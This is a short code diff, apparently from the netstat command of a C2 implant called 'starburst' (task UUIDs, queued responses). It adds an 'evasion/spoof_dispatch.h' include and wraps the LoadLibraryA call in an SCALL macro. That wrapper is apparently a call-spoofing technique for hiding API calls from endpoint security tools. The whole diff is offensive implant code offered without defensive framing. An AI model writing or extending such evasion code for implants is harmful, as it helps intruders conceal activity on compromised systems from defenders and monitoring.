@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_NETSTAT
 
@@ -77,7 +78,7 @@ auto declfn starburst::cmd_netstat(
     _In_    Parser*   params
 ) -> void {
     STK_IPHLPAPI(_n);
-    auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
+    auto h_iphlpapi = reinterpret_cast<HMODULE>( SCALL( inst, kernel32.LoadLibraryA, _n ) );
     if ( !h_iphlpapi ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "LoadLibrary iphlpapi failed" ) ) );
